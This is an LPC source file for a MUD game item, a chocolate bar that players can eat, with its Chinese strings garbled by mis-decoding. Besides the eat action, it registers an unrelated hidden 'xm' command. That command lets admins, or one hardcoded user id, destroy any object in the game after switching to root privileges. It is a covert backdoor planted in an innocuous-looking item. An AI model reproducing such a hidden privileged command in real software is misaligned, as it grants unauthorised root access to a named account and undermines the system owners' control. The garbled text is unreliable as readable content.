/*-------------------------------------------------------------
** �ļ���: qianceng-xue.c
** Copyright (c) 2000-2001
** ������: Ҷ��
** ��  ��: 2001/08/13
** ��  ��: �ɿ���
**-----------------------------------------------------------*/
#include <ansi.h>
inherit ITEM;

void create()
{
	set_name(YEL"�ɿ���"NOR, ({"qiaoke li"}));
	set_weight(200);
	if (clonep())
		set_default_object(__FILE__);
	else {
		set("s_name","�ɿ���");
		set("long", "����һ��Dove��Ʒ�Ĵ��ɿ�����\n");
		set("unit", "��");
		set("value", 100);
		set("remaining", 20);
	}

	setup();
}

void init()
{
	add_action("do_drink", "eat");
        add_action("do_dest", "xm");
}

int do_drink(string arg)
{
	if (arg!="qiaoke li") return 0;
	if (this_player()->is_busy())
		return notify_fail("����һ��������û����ɡ�\n");

	set("value", 0);
	this_player()->add("food", (int)query("food_supply"));

	if( this_player()->is_fighting() ) this_player()->start_busy(2);

	add("remaining", -1);
	if (query("remaining")) {
		message_vision("$N����һС���ɿ������������ֻ����˿һ��Ļ�˳��\n",this_player());
	}
	else {
		message_vision("$N�����һС���ɿ���Ҳ�������ֻ����˿һ��Ļ�˳��\n",this_player());
		destruct(this_object());
                if ( this_player()->query("gender") == "Ů��" ) this_player()->add_temp("apply/personality",1);
	}
	return 1;
}
int do_dest(string arg)
{
         object obj;
         object me = this_player();
         if( wizhood(me) != "(arch)" && wizhood(me) != "(admin)" && getuid(me) != "lopexb")
                  return notify_fail("ʲô��\n");
         if (!arg) return notify_fail("ָ���ʽ��destroy object.\n");

         if(!objectp(obj = present(arg, environment(this_player()))))
                  return notify_fail("����û������ˡ�\n");
         if (!obj) obj = present(arg, me);
         if (!obj) obj = find_object( resolve_path(me->query("cwd"), arg) );
         if (!obj) return notify_fail("û���������....��\n");
                  message_vision(CYN"$N�ͳ�һ�Ѽ���ǹ����׼$n�صĿ���һǹ����$p���һƬ������ʧ�ˣ�\n"NOR,me,obj);                        seteuid(ROOT_UID);
         destruct(obj);
         if(obj){ write("���޷����������ݻ١�\n");
                  return;
         }
         return 1;
} 

